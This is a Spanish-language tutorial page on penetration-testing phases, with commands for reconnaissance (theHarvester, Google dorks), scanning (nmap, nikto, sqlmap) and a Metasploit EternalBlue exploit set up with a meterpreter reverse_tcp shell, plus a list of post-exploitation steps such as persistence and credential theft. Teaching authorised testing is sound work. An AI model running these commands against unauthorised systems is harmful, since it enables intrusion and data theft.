Hacking Ético y Pentesting

Metodologías, herramientas y técnicas de pruebas de penetración autorizadas.

⚠️ IMPORTANTE: Las técnicas mostradas aquí son SOLO para fines educativos y de pruebas autorizadas. Realizar pruebas de penetración sin autorización escrita es ILEGAL.

Fases del Pentesting

Un pentest profesional sigue una metodología estructurada de 5-6 fases.

Fase 1: Reconocimiento

Recopilación passiva de información sobre el objetivo SIN interactuar directamente con sus sistemas.

whois
Información de registro de dominios
theHarvester
Emails, subdominios, IPs públicas
Shodan
Motor de búsqueda de dispositivos IoT
Google Dorking
Búsquedas avanzadas en Google
# Reconocimiento con theHarvester theHarvester -d ejemplo.com -b google,linkedin -f report.html # Google Dorks útiles site:ejemplo.com filetype:pdf site:ejemplo.com inurl:admin intitle:"index of" "parent directory"
Fase 2: Escaneo

Escaneo activo para descubrir puertos, servicios, vulnerabilidades y versiones.

# Nmap - Escáner de redes nmap -sV -sC -O -A ejemplo.com # Detección completa nmap -p- --min-rate 5000 ejemplo.com # Todos los puertos rápido nmap --script vuln ejemplo.com # Scan de vulnerabilidades # Nikto - Scanner web nikto -h https://ejemplo.com # SQLmap - Inyección SQL automatizada sqlmap -u "https://ejemplo.com/page?id=1" --dbs --batch
Fase 3: Explotación

Aprovechamiento de vulnerabilidades descubiertas para obtener acceso no autorizado (con autorización).

Metasploit
Framework de exploit más grande del mundo
Burp Suite
Proxy y scanner para aplicaciones web
Cobalt Strike
Plataforma profesional de adversary simulation
# Metasploit Framework msfconsole # Buscar exploit msf6> search eternalblue # Configurar y ejecutar msf6> use exploit/windows/smb/ms17_010_eternalblue msf6> set RHOSTS 192.168.1.100 msf6> set PAYLOAD windows/x64/meterpreter/reverse_tcp msf6> set LHOST 192.168.1.50 msf6> exploit
Fase 4: Post-Explotación

Una vez dentro, se busca escalar privilegios, moverse lateralmente y persistir.

  • Escalada de privilegios: kernel exploits, SUID, misconfigurations
  • Movimiento lateral: pass-the-hash,PsExec, WMI
  • Persistencia: scheduled tasks, registry keys, backdoors
  • Exfiltración: robo de credenciales, datos sensibles
Fase 5: Informe

Documentación profesional de hallazgos, impacto y recomendaciones.

Estructura del informe:

  1. Resumen ejecutivo (para directivos)
  2. Alcance y metodología
  3. Hallazgos clasificados por severidad (CVSS)
  4. Evidencia de cada vulnerabilidad
  5. Recomendaciones con prioridad
  6. Plan de remediación con timeline
